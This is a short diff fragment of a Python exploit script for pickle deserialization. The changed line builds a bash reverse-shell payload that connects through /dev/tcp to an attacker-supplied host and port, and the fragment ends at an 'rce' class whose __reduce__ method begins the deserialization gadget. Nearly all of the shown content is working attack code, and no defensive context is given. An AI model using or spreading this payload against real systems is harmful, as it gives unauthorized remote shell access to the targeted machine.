@@ -15,7 +15,7 @@ from sys import argv
 try: lhost, lport = argv[1:]
 except: exit('Usage: python pickle-deserialization.py lhost lport')
 
-payload = f'bash -c "bash -i &>/dev/tcp/{lhost}/{lport}<&1"'  #  <-- Place Your Payload here
+payload = f'/bin/bash -c "/bin/bash -i &>/dev/tcp/{lhost}/{lport}<&1"'  #  <-- Place Your Payload here
 
 class rce():
     def __reduce__(self):
